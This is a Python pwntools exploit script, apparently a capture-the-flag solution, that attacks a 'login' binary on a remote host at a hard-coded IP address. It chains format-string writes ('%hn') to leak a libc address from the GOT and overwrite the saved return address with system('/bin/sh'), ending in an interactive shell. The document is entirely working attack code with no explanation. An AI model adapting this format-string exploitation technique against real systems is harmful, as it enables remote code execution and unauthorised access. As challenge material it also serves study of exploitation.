from pwn import*
from LibcSearcher import LibcSearcher
#print the ret_addr from stack
#p = process('./login')
p = remote('108.160.139.79',9090)
elf = ELF('./login')
libc = ELF('./libc6_2.27.so')
context.log_level = 'debug'
#gdb.attach(p)
def NewAddr(address,modifiedAddress):
	print('Modified Address:\t%x'%modifiedAddress)
	modified_high = (modifiedAddress &0xffff0000) >> 16
	modified_low  = modifiedAddress &0xffff
	#
	temp_low = (address + 2) &0xffff
	print ('Temp_Low:\t%x'%temp_low)
	payload1 = '%' + str(temp_low) + 'c' + '%21$hn'
	p.sendline(payload1)
	p.recvrepeat(0.5)
	#
	temp_high = (address) & 0xffff
	print ('Temp_High:\t%x'%temp_high)
	payload2 = '%' + str(temp_high) + 'c' + '%22$hn'
	p.sendline(payload2)
	p.recvrepeat(0.5)
	#
	payload3 = '%' + str(modified_high) + 'c' + '%57$hn'
	p.sendline(payload3)
	p.recvrepeat(0.5)
	payload4 = '%' + str(modified_low) +  'c' + '%59$hn'
	p.sendline(payload4)
	p.recvrepeat(0.5)
#.......................
system_offset = 0X3CD10
binsh_offset = 0x17B8CF
puts_got = elf.got['puts']
puts_offset = 0x067360
p.sendlineafter('name: ','FMYY')
#.......................
load1 = '%6$x' 
p.sendlineafter('password: ',load1)
p.recvline()
ebp_addr = int(p.recvuntil('\n')[-9:-1],16) - 0x10
NewAddr(ebp_addr + 0x10,puts_got)
p.sendline('%10$s')
puts_addr = u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
print 'Puts_Addr:\t' + hex(puts_addr)
libcbase = puts_addr - puts_offset
system_addr = libcbase + system_offset
binsh_addr = libcbase + binsh_offset
print 'System_Addr:\t' + hex(system_addr)
print 'Binsh_Addr:\t ' + hex(binsh_addr)
ret_addr = ebp_addr + 0x4
arg_addr = ebp_addr + 0xC
NewAddr(ret_addr,system_addr)
NewAddr(arg_addr,binsh_addr)
p.sendline('wllmmllw')
p.interactive()
